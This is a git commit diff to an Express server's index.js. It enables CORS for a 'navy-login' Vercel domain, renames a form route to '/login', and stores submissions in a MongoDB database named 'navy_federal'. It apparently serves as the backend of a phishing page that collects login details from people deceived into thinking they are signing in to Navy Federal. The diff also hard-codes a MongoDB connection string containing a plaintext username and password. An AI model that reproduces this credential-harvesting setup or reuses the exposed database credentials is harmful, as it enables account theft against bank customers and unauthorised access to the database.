a170ad25386189e6451bc79c4f09e1734941f3b6
sundayonah <sundayonah94@gmail.com>
2024-05-21 10:33:12 +0100

    fix: 404

--- index.js
+++ index.js
@@ -6,16 +6,21 @@ const app = express();
 const port = 3000;
 
 const allowedOrigins = ['http://localhost:3000', 'http://127.0.0.1:5500', 'https://navy-login.vercel.app'];
+
 app.use(cors({
     origin: function (origin, callback) {
+        // Allow requests with no origin (like mobile apps or curl requests)
         if (!origin || allowedOrigins.indexOf(origin) !== -1) {
             callback(null, true);
         } else {
             callback(new Error('Not allowed by CORS'));
         }
-    }
+    },
+    credentials: true
 }));
 
+
+// app.use(cors());
 
 app.use(express.json());
 // Serve static files from the 'public' directory
@@ -23,7 +28,7 @@ app.use(express.static('public'));
 
 // MongoDB connection string
  const uri = "mongodb+srv://tylercrosson23:June23Csm1.@navy.pjcjbaz.mongodb.net/"
-console.log(`MongoDB Connection URI: ${uri}`);
+// console.log(`MongoDB Connection URI: ${uri}`);
 
 let client;
 
@@ -51,7 +56,7 @@ app.get('/', (req, res) => {
 
 
 // POST endpoint to handle form submissions
-app.post('/submit-form', async (req, res) => {
+app.post('/login', async (req, res) => {
   try {
     await connectDB();
     const db = client.db('navy_federal');
